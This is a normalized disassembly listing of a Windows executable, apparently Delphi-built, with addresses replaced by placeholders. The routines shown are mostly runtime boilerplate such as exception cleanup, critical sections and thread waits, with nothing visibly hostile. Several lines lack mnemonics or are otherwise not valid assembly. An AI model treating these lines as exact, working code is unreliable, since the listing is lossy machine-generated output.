mov eax [ r-xdata ]
call sub_40bd78
call sub_403ad0
pop ebx
retn
sub_4080c8
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_408090
test eax eax
sete al
pop esi
pop ebx
retn
sub_408626
jmp sub_403a98
sub_40862d
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_408634
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_4085c0
pop esi
pop ebx
retn
sub_4086c4
call sub_4086a0
retn
sub_40875c
push eax
call CloseHandle
retn
sub_4087cc
push ebx
mov ebx eax
mov eax ebx
call sub_408764
inc eax
setne al
pop ebx
retn
sub_4089a4
mov edx edi
mov edi eax
mov ecx 0xffffffff
xor al al
[ edi ]
lea eax [ edi - 0x1 ]
mov edi edx
retn
sub_4089b8
push esi
mov esi eax
xchg edx eax
call sub_4028f0
mov eax esi
pop esi
retn
sub_408ba4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx ebx
call sub_40428c
pop esi
pop ebx
retn
sub_408bb8
push ebx
mov ebx eax
add ebx 0x4
mov eax ebx
call sub_4026f4
mov [ eax ] ebx
add eax 0x4
pop ebx
retn
sub_408bcc
sub eax 0x4
mov eax [ eax ]
sub eax 0x4
retn
sub_408c04
test eax eax
je r-xdata
retn
sub eax 0x4
mov edx [ eax ]
call sub_402714
sub_408c6c
push ebx
mov ecx [ rw-data ]
cmp [ ecx ] 0x0
je r-xdata
mov al 0x10
call sub_402850
mov ebx [ rw-data ]
mov ebx [ ebx ]
call ebx
pop ebx
retn
sub_408c90
push ebx
mov ebx eax
mov eax ebx
call sub_404094
pop ebx
retn
sub_408ff3
push ebx
push eax
lea eax [ ebp - 0x14 ]
mov ebx [ ebp - 0x4 ]
call sub_404094
pop eax
pop ebx
retn
sub_4092ab
cmp [ ebp - 0x2a ] 0x0
je r-xdata
retn
mov al 0x2d
stosb [ edi ]
sub_409406
push esi
mov esi [ ebp - 0xc ]
test esi esi
je r-xdata
pop esi
retn
mov ecx [ esi - 0x4 ]
[ edi ] [ esi ]
sub_409a57
lodsb [ esi ]
or al al
je r-xdata
dec esi
retn
cmp al 0x20
je sub_409a57
sub_409b6c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_404554
mov edx esi
xor ecx ecx
call sub_4099a0
pop esi
pop ebx
retn
sub_409be0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_404554
mov edx esi
mov cl 0x1
call sub_4099a0
pop esi
pop ebx
retn
sub_40a2b6
jmp sub_403a98
sub_40a2bd
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40a3ae
jmp sub_403a98
sub_40a3b5
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40ab59
jmp sub_403a98
sub_40ab60
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40abe8
push ebp
mov ebp esp
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
xor edx edx
call sub_40ab8c
pop ebp
retn 0x8
sub_40ad2d
jmp sub_403a98
sub_40ad34
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_40b1d7
jmp sub_403a98
sub_40b1de
mov al [ ebp - 0x9 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40b6c3
jmp sub_403a98
sub_40b6ca
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40b775
jmp sub_403a98
sub_40b77c
mov eax esi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_40b81f
jmp sub_403a98
sub_40b826
pop esi
pop ecx
pop ebp
retn
sub_40ba02
jmp sub_403a98
sub_40ba09
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40ba60
test eax eax
je r-xdata
retn
sub eax 0x1000
sub_40bd52
jmp sub_403a98
sub_40be20
jmp sub_403a98
sub_40be48
cmp [ eax + 0xc ] 0x0
je r-xdata
retn
call sub_4032f8
sub_40bfe4
jmp sub_403a98
sub_40bfeb
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40bff4
mov esp ecx
mov [ esp ] edx
mov ebp [ ebp ]
jmp sub_403ad0
sub_40c001
retn
sub_40c004
push ebp
mov ebp esp
call sub_40bf48
lea ecx [ ebp + 0x8 ]
add ecx 0x4
mov edx [ ebp + 0x8 ]
call sub_40bff4
pop ebp
retn 0x4
sub_40c020
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bd78
call sub_403ad0
retn
sub_40c0b8
push ebx
mov ebx eax
mov eax ebx
call sub_40c038
and eax 0xff
mov eax [ eax * 8 + rw-data ]
pop ebx
retn
sub_40c28b
jmp sub_403a98
sub_40c292
mov eax ebx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40c357
jmp sub_403a98
sub_40c35e
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_40c368
call sub_40bbf4
mov eax 0x1
call sub_40407c
sub_40c4ec
cmp eax [ rw-data ]
jl r-xdata
mov al 0x1
retn
cmp eax [ rw-data ]
jne r-xdata
xor eax eax
retn
cmp edx [ rw-data ]
jle r-xdata
sub_40c5c5
jmp sub_403a98
sub_40c5e2
jmp sub_403a98
sub_40c5e9
mov eax [ ebp - 0x4 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_40c694
xor ecx ecx
cmp [ rw-data ] 0x0
je r-xdata
mov eax ecx
retn
call sub_40c5f8
mov ecx eax
sub_40c880
push ebx
mov ebx eax
cmp [ rw-data ] 0x0
je r-xdata
mov eax 0x1
pop ebx
retn
push ebx
call CharNextA
sub eax ebx
pop ebx
retn
sub_40c8a0
push eax
call CharNextA
retn
sub_40cbc8
jmp sub_403a98
sub_40cbcf
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_40cc38
mov eax [ rw-data ]
cmp eax 0x1f
ja r-xdata
setb al
retn
bt [ rw-data ] eax
sub_40d08f
jmp sub_403a98
sub_40d096
pop ebx
mov esp ebp
pop ebp
retn
Sleep
jmp [ Sleep@IAT ]
sub_40d1d4
jmp sub_403a98
sub_40d1db
pop ebx
mov esp ebp
pop ebp
retn
sub_40d1e0
push ebx
mov ebx eax
test ebx ebx
jne r-xdata
mov eax ebx
pop ebx
retn
call sub_40d144
sub_40d1f0
push ebx
mov al 0x1
mov ebx [ rw-data ]
jmp r-xdata
test al al
je r-xdata
pop ebx
retn
test ebx ebx
jne r-xdata
call [ ebx + 0x4 ]
mov ebx [ ebx ]
sub_40d20c
push ebx
mov ebx rw-data
jmp r-xdata
cmp [ ebx ] 0x0
jne r-xdata
mov eax [ ebx ]
mov edx [ eax ]
mov [ ebx ] edx
mov edx 0x8
call sub_402714
pop ebx
retn
sub_40d294
mov edx 0xffffffff
xchg edx eax
[ edx ] eax
dec eax
retn
sub_40d2a0
xchg [ eax ] edx
mov eax edx
retn
sub_40d300
push ebp
mov ebp esp
push ecx
call GetCurrentThreadId
mov [ ebp - 0x2 ] ax
mov al [ ebp - 0x2 ]
xor al [ ebp - 0x1 ]
and al 0xf
pop ecx
pop ebp
retn
sub_40d390
mov eax [ edx ]
xor ecx ecx
mov [ eax + 0x4 ] ecx
mov eax [ edx ]
xor edx edx
mov [ eax + 0x8 ] edx
retn
sub_40d4a8
mov eax [ eax + 0x10 ]
push eax
call SetEvent
retn
sub_40d4d0
mov edx [ eax + 0x18 ]
push edx
mov eax [ eax + 0x14 ]
push eax
call WaitForSingleObject
retn
sub_40d74b
jmp sub_403a98
sub_40d752
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_40d7c0
jmp sub_403a98
sub_40d7c7
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40d7e5
mov eax [ ebp - 0xc ]
push eax
call SetErrorMode
retn
sub_40d7de
jmp sub_403a98
sub_40d7e5
mov eax [ ebp - 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_40dca8
jmp sub_403a98
sub_40dcaf
pop ebp
retn
VariantInit
jmp [ __import_lookup_table_11(oleaut32:VariantInit) ]
VariantChangeType
jmp [ VariantChangeType@IAT ]
sub_40dd28
push ebp
mov ebp esp
mov eax 0x80004001
pop ebp
retn 0x10
sub_40dd8e
jmp sub_403a98
sub_40dd95
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x10
sub_40ddfa
jmp sub_403a98
sub_40de01
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x10
sub_40de66
jmp sub_403a98
sub_40de6d
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x10
sub_40ded2
jmp sub_403a98
sub_40ded9
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x10
sub_40df3e
jmp sub_403a98
sub_40df45
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x10
sub_40dfbd
jmp sub_403a98
sub_40dfc4
mov eax ebx
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x10
sub_40e030
jmp sub_403a98
sub_40e037
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x14
sub_40e0a0
jmp sub_403a98
sub_40e0a7
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x14
sub_40e114
jmp sub_403a98
sub_40e11b
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x10
SafeArrayCreate
jmp [ SafeArrayCreate@IAT ]
SafeArrayGetLBound
jmp [ SafeArrayGetLBound@IAT ]
SafeArrayGetUBound
jmp [ SafeArrayGetUBound@IAT ]
sub_40e4a1
jmp sub_403a98
sub_40e4a8
pop ebp
retn
sub_40e4ac
sub [ rw-data ] 0x1
jae r-xdata
retn
call sub_40e170
sub_40e4bd
add [ esp + 0x4 ] 0xfffffff8
mov eax [ esp + 0x4 ]
mov eax [ eax ]
jmp [ eax ]
sub_40eade
jmp sub_403a98
sub_40eae5
pop ecx
pop ebp
retn
sub_40eb77
jmp sub_403a98
sub_40eb7e
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40ebce
jmp sub_403a98
sub_40ebd5
pop ecx
pop ebp
retn
sub_40ec67
jmp sub_403a98
sub_40ec6e
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40ecbe
jmp sub_403a98
sub_40ecc5
pop ecx
pop ebp
retn
sub_40ef0d
jmp sub_403a98
sub_40ef14
pop ebx
mov esp ebp
pop ebp
retn
sub_40efa6
jmp sub_403a98
sub_40efad
pop ecx
pop ebp
retn
sub_40efb0
push ebx
mov ebx eax
mov eax ebx
call sub_40f248
mov [ ebx ] 0x1
pop ebx
retn
sub_40f248
test [ eax ] 0xbfe8
jne r-xdata
call sub_40f1cc
retn
mov [ eax ] 0x0
retn
sub_40f25c
push eax
call sub_40f248
pop eax
retn
sub_40f4bc
call sub_40f570
retn
sub_40f6da
jmp sub_403a98
sub_40f6e1
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40f785
jmp sub_403a98
sub_40f78c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40f7ae
lea eax [ ebp - 0x18 ]
mov edx 0x2
call sub_40478c
retn
sub_40f7a7
jmp sub_403a98
sub_40f7ae
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40f80a
jmp sub_403a98
sub_40f811
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40f88d
jmp sub_403a98
sub_40fdd3
jmp sub_403a98
sub_40fdda
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40fe6d
jmp sub_403a98
sub_40fe74
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40fe91
lea eax [ ebp - 0x14 ]
call sub_404774
retn
sub_40fe8a
jmp sub_403a98
sub_40fe91
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40feee
jmp sub_403a98
sub_40fef5
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40ff97
jmp sub_403a98
sub_40ffb4
jmp sub_403a98
sub_40ffbb
mov al [ ebp - 0x5 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_410516
jmp sub_403a98
sub_41051d
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4105c8
push eax
call sub_40f248
pop eax
mov [ eax ] 0x7
fstp [ eax + 0x8 ]
fwait
retn
sub_4105dc
push eax
call sub_40f248
pop eax
mov [ eax ] 0x6
fistp [ eax + 0x8 ]
fwait
retn
sub_410654
cmp [ eax ] 0x8
jb r-xdata
retn
push [ eax + 0xc ]
push [ eax + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
mov [ eax ] 0x0
mov edx esp
call sub_40f570
add esp 0x10
sub_4108fe
jmp sub_403a98
sub_410905
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_410948
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_40f248
mov [ ebx ] 0xa
mov [ ebx + 0x8 ] esi
pop esi
pop ebx
retn
sub_410960
mov edx 0x80020004
call sub_410948
retn
sub_410980
[ eax + 0x80040e5 ]
sub_4109f1
jmp sub_403a98
sub_4109f8
pop esi
pop ebx
pop ebp
retn
sub_4109fc
push ebp
mov ebp esp
call sub_410bbc
pop ebp
retn 0x4
sub_410a88
push ebp
mov ebp esp
call sub_410bbc
pop ebp
retn 0x4
sub_410b6b
jmp sub_403a98
sub_410b72
mov dl [ ebp - 0x5 ]
and dl 0xfc
mov eax [ ebp - 0x4 ]
call sub_403334
cmp [ ebp - 0x5 ] 0x0
jle r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_4036b8
sub_410b94
xor eax eax
retn
sub_410b98
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov ax [ eax + 0x4 ]
mov [ edx ] ax
mov al 0x1
pop ebp
retn 0x4
sub_410bac
mov [ ecx ] 0x8
mov al 0x1
retn
sub_410bb4
call sub_40ea94
retn
sub_410bbc
call sub_40eb84
retn
sub_410bc4
call sub_40ef5c
retn
sub_410bcc
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov ax [ eax + 0x4 ]
mov [ edx ] ax
mov al 0x1
pop ebp
retn 0x4
sub_410be0
call sub_410bbc
retn
sub_410be8
push ebp
mov ebp esp
call sub_410bc4
pop ebp
retn 0x8
sub_410c00
push ebp
mov ebp esp
or eax 0xffffffff
pop ebp
retn 0x4
sub_410cdc
jmp sub_403a98
sub_410da5
jmp sub_403a98
sub_410dac
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_410dc9
lea eax [ ebp - 0x10 ]
call sub_404094
retn
sub_410dc2
jmp sub_403a98
sub_410dc9
mov al [ ebp - 0x9 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_410dd4
call sub_40efb0
retn
sub_410e4b
jmp sub_403a98
sub_410e52
pop ebp
retn
sub_410ef5
jmp sub_403a98
sub_410efc
pop ebp
retn
sub_41103d
jmp sub_403a98
sub_411044
pop ebp
retn
sub_411048
sub [ rw-data ] 0x1
retn
sub_41107c
xor edx edx
mov dl [ eax + 0x1 ]
lea eax [ eax + edx + 0x2 ]
retn
sub_411300
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx esi
call sub_4040e8
pop esi
pop ebx
retn
sub_41139c
jmp sub_403a98
sub_4113a3
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_41149e
jmp sub_403a98
sub_4114a5
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4116a4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx esi
call sub_40f570
pop esi
pop ebx
retn
sub_411826
jmp sub_403a98
sub_41182d
pop ebp
retn
sub_411830
sub [ rw-data ] 0x1
retn
sub_41185d
jmp sub_403a98
sub_411864
pop ebp
retn
sub_411868
sub [ rw-data ] 0x1
retn
sub_412195
add [ esp + 0x4 ] 0xfffffff8
jmp sub_414bc8
sub_4128e8
retn 0x4128
sub_412b73
add [ esp + 0x4 ] 0xffffffd8
jmp sub_41a580
sub_412b7d
add [ esp + 0x4 ] 0xffffffd8
jmp sub_41a5a0
sub_412b87
add [ esp + 0x4 ] 0xffffffd4
mov eax [ esp + 0x4 ]
mov eax [ eax ]
jmp [ eax + 0x28 ]
sub_412ef4
push ecx
mov [ esp ] ax
mov [ esp + 0x2 ] dx
mov eax [ esp ]
pop edx
retn
sub_413018
mov eax [ eax + 0xc ]
call sub_414210
retn
sub_4132ef
jmp sub_403a98
sub_4132f6
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4132fc
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x4 ]
call sub_414418
test eax eax
setge al
pop esi
pop ebx
retn
sub_4135ff
jmp sub_403a98
sub_413606
mov esp ebp
pop ebp
retn
sub_4136d4
add eax 0x8
push eax
call EnterCriticalSection
retn
sub_4136e0
push ebx
mov ebx edx
mov edx ebx
call sub_4134f4
test eax eax
je r-xdata
pop ebx
retn
mov edx ebx
call sub_413254
sub_41378c
add eax 0x8
push eax
call LeaveCriticalSection
retn
sub_4138e7
jmp sub_403a98
sub_4139bb
jmp sub_403a98
sub_4139cc
mov eax [ eax - 0x38 ]
or eax eax
je r-xdata
retn
mov eax [ eax + 0x2 ]
sub_413a38
jmp sub_403a98
sub_413a3f
pop ebx
mov esp ebp
pop ebp
retn
sub_413a8a
jmp sub_403a98
sub_413a91
mov eax [ ebp - 0x4 ]
pop ebx
pop ecx
pop ebp
retn
sub_413b1d
jmp sub_403a98
sub_413b24
pop ebx
pop ebp
retn
sub_413b9e
jmp sub_403a98
sub_413ba5
pop ebx
pop ebp
retn
sub_413bea
jmp sub_403a98
sub_413bf1
pop ebx
pop ebp
retn
sub_413c3b
jmp sub_403a98
sub_413c42
pop esi
pop ebx
pop ebp
retn
sub_413c96
jmp sub_403a98
sub_413c9d
mov eax [ ebp - 0x4 ]
pop ebx
pop ecx
pop ebp
retn
sub_413dca
jmp sub_403a98
sub_413ea0
cmp [ rw-data ] 0x0
je r-xdata
retn
mov edx eax
mov eax [ rw-data ]
call sub_414500
sub_413f90
jmp sub_403a98
sub_41411a
jmp sub_403a98
sub_414121
mov eax ebx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4141bb
jmp sub_403a98
sub_4141c2
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4141e1
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x18 ]
retn
sub_4141da
jmp sub_403a98
sub_4141e1
mov al [ ebp - 0x9 ]
mov esp ebp
pop ebp
retn
sub_414244
push ebx
mov ebx eax
xor edx edx
mov eax ebx
call sub_41455c
xor edx edx
mov eax ebx
call sub_414520
pop ebx
retn
sub_4142bc
mov eax [ ebp + 0x4 ]
retn
sub_4142f2
pop ecx
pop edx
pop esi
pop ebx
retn
sub_414340
jmp sub_403a98
sub_414347
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_41439c
push ebx
mov ebx eax
mov eax [ ebx + 0x8 ]
cmp eax [ ebx + 0xc ]
jne r-xdata
mov eax ebx
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx ]
sub_4143b4
xor edx edx
call sub_4143bc
retn
sub_4144a4
mov edx [ eax + 0x8 ]
dec edx
call sub_4143bc
retn
sub_414608
retn
sub_4146c2
jmp sub_403a98
sub_4146c9
cmp [ ebp - 0x5 ] 0x0
jle r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_4036b8
sub_414758
jmp sub_403a98
sub_41475f
pop ebx
pop ecx
pop ebp
retn
sub_414764
push ebx
mov ebx eax
lea eax [ ebx + 0x8 ]
push eax
call EnterCriticalSection
mov eax [ ebx + 0x4 ]
pop ebx
retn
sub_4147bb
jmp sub_403a98
sub_4147c2
pop ebx
pop ecx
pop ebp
retn
sub_4147c8
add eax 0x8
push eax
call LeaveCriticalSection
retn
sub_414804
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bd78
call sub_403ad0
retn
sub_41481c
mov ecx eax
cmp edx eax
jge r-xdata
mov eax ecx
retn
mov ecx edx
sub_4148f7
retn
sub_4148f8
cmp edx [ eax + 0x4 ]
jae sub_414804
mov eax [ eax + 0x8 ]
bt [ eax ] edx
sbb eax eax
and eax 0x1
retn
sub_4149b4
test edx edx
je r-xdata
xor edx edx
call sub_4149c8
retn
xchg edx eax
mov ecx [ eax ]
call [ ecx ]
retn
sub_414a7e
jmp sub_403a98
sub_414a85
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_414a98
xchg edx eax
call sub_4149c8
retn
sub_414aa0
retn
sub_414b39
jmp sub_403a98
sub_414b40
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_414c8a
jmp sub_403a98
sub_414d9a
jmp sub_403a98
sub_414da1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_414dbe
lea eax [ ebp - 0xc ]
call sub_404094
retn
sub_414db7
jmp sub_403a98
sub_414dbe
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_414e48
jmp sub_403a98
sub_414e60
push ebx
mov ebx eax
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
inc [ ebx + 0x8 ]
pop ebx
retn
mov dl 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x30 ]
sub_414f1c
dec [ eax + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
retn
xor edx edx
mov ecx [ eax ]
call [ ecx + 0x30 ]
sub_414fc5
jmp sub_403a98
sub_414fcc
mov al [ ebp - 0x9 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_414fd8
mov eax [ ebp + 0x4 ]
retn
sub_41500e
pop ecx
pop edx
pop esi
pop ebx
retn
sub_41505c
jmp sub_403a98
sub_415063
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_415122
jmp sub_403a98
sub_415129
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41514b
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_4040b8
retn
sub_415144
jmp sub_403a98
sub_41514b
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_415154
mov edx [ eax ]
call [ edx + 0x14 ]
retn
sub_41515c
xor eax eax
retn
sub_4151a5
jmp sub_403a98
sub_4151ac
mov eax ebx
pop ebx
pop ecx
pop ebp
retn
sub_4152bf
jmp sub_403a98
sub_4152c6
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_415354
jmp sub_403a98
sub_41535b
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41542b
jmp sub_403a98
sub_415432
mov eax [ ebp - 0x8 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4154e8
jmp sub_403a98
sub_4154ef
pop esi
pop ecx
pop ebp
retn
sub_415574
jmp sub_403a98
sub_41557b
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_415598
lea eax [ ebp - 0x8 ]
call sub_404094
retn
sub_415591
jmp sub_403a98
sub_415598
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_415624
jmp sub_403a98
sub_415641
jmp sub_403a98
sub_415648
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_415684
retn
sub_415707
jmp sub_403a98
sub_41570e
mov eax [ ebp - 0x8 ]
call sub_418248
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_415733
lea eax [ ebp - 0xc ]
call sub_404094
retn
sub_41572c
jmp sub_403a98
sub_415733
mov esp ebp
pop ebp
retn
sub_415783
jmp sub_403a98
sub_41578a
pop esi
pop ecx
pop ebp
retn
sub_4157dd
jmp sub_403a98
sub_4157e4
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4157ec
retn
sub_415867
jmp sub_403a98
sub_41586e
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_41590b
jmp sub_403a98
sub_415912
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41592f
lea eax [ ebp - 0x8 ]
call sub_404094
retn
sub_415928
jmp sub_403a98
sub_41592f
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_415934
retn
sub_4159ae
jmp sub_403a98
sub_4159b5
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4159bc
mov eax edx
mov edx ecx
call sub_408090
retn
sub_4159c8
push ebx
mov ebx eax
test [ ebx + 0x4 ] 0x4
jne r-xdata
mov al [ ebx + 0x7 ]
pop ebx
retn
mov dl 0x3d
mov eax ebx
call sub_4159e0
sub_415a58
push ebx
xor ecx ecx
mov ebx [ eax ]
call [ ebx + 0x3c ]
pop ebx
retn
sub_415ac8
push ebx
cmp [ eax + 0x8 ] 0x0
jne r-xdata
pop ebx
retn
cmp [ eax + 0x22 ] 0x0
je r-xdata
mov ebx eax
mov edx eax
mov eax [ ebx + 0x24 ]
call [ ebx + 0x20 ]
sub_415ae4
push ebx
cmp [ eax + 0x8 ] 0x0
jne r-xdata
pop ebx
retn
cmp [ eax + 0x2a ] 0x0
je r-xdata
mov ebx eax
mov edx eax
mov eax [ ebx + 0x2c ]
call [ ebx + 0x28 ]
sub_415cd8
mov eax [ eax + 0x18 ]
retn
sub_415cdc
mov eax [ eax + 0x14 ]
retn
sub_415d78
push ebx
push esi
mov esi eax
push 0x0
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x64 ]
pop esi
pop ebx
retn
sub_415f84
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
shl edx 0x3
lea eax [ ebx + 0x10 ]
call sub_402734
mov [ ebx + 0x18 ] esi
pop esi
pop ebx
retn
sub_415fc0
test dl dl
je r-xdata
mov edx [ eax ]
call [ edx + 0x80 ]
retn
mov edx [ eax ]
call [ edx + 0x84 ]
retn
sub_415fd8
push ebx
mov ebx [ eax + 0x10 ]
mov ecx [ ebx + ecx * 8 ]
mov ebx [ eax + 0x10 ]
mov edx [ ebx + edx * 8 ]
mov ebx [ eax ]
call [ ebx + 0x34 ]
pop ebx
retn
sub_415fec
mov edx sub_415fd8
mov ecx [ eax ]
call [ ecx + 0x94 ]
retn
sub_416034
cmp [ eax + 0x1e ] 0x0
je r-xdata
mov eax edx
mov edx ecx
call sub_408090
retn
mov eax edx
mov edx ecx
call sub_408058
retn
sub_4160d0
retn
sub_4163c8
jmp sub_403a98
sub_4163cf
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_416430
jmp sub_403a98
sub_416437
mov eax [ ebp - 0x4 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_41647c
mov eax [ eax + 0x4 ]
call sub_4086cc
cmp eax 0xffffffff
jne r-xdata
retn
xor eax eax
sub_41648c
mov eax [ eax + 0x4 ]
call sub_4086f8
cmp eax 0xffffffff
jne r-xdata
retn
xor eax eax
sub_4164c8
push ebx
mov ebx edx
mov ecx eax
mov eax ebx
cdq
push edx
push eax
mov eax ecx
mov edx [ eax ]
call [ edx + 0x8 ]
pop ebx
retn
sub_416671
jmp sub_403a98
sub_4166d0
mov [ eax + 0x4 ] edx
mov [ eax + 0x8 ] ecx
retn
sub_416760
push ebx
mov ebx eax
xor edx edx
mov eax ebx
call sub_4167b0
xor eax eax
mov [ ebx + 0x8 ] eax
xor eax eax
mov [ ebx + 0xc ] eax
pop ebx
retn
sub_41699b
jmp sub_403a98
sub_4169a2
mov esp ebp
pop ebp
retn
sub_416a4c
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bd78
call sub_403ad0
retn
sub_416ad4
mov [ eax + 0x18 ] edx
retn
sub_416c50
mov ecx edx
mov edx [ eax + 0x4 ]
mov eax [ eax + 0xc ]
xchg edx eax
call sub_41121c
retn
sub_416cd7
jmp sub_403a98
sub_416cde
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_416d8a
jmp sub_403a98
sub_416d91
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_416f35
jmp sub_403a98
sub_416f87
jmp sub_403a98
sub_416fa6
jmp sub_403a98
sub_416fad
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_416fcc
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x18 ]
retn
sub_416fc5
jmp sub_403a98
sub_416fcc
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41706f
jmp sub_403a98
sub_4170f7
jmp sub_403a98
sub_417104
push ebx
mov ebx eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bd78
call sub_403ad0
pop ebx
retn
sub_41711c
mov eax [ rw-data ]
call sub_417104
retn
sub_417154
push ebx
call sub_4110d4
mov ebx eax
cmp ebx 0xffffffff
jne r-xdata
mov eax ebx
pop ebx
retn
call sub_41711c
sub_4172c1
jmp sub_403a98
sub_4172c8
mov eax [ ebp - 0x4 ]
add eax 0x70
call sub_404094
pop ebx
mov esp ebp
pop ebp
retn 0x10
sub_4173e8
jmp sub_403a98
sub_4173ef
pop edi
pop esi
pop ebx
pop ebp
retn
sub_4174e6
jmp sub_403a98
sub_417503
jmp sub_403a98
sub_41750a
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_417608
push ebx
mov ebx eax
mov eax [ ebx + 0x4 ]
call sub_416050
mov edx [ ebx + 0x14 ]
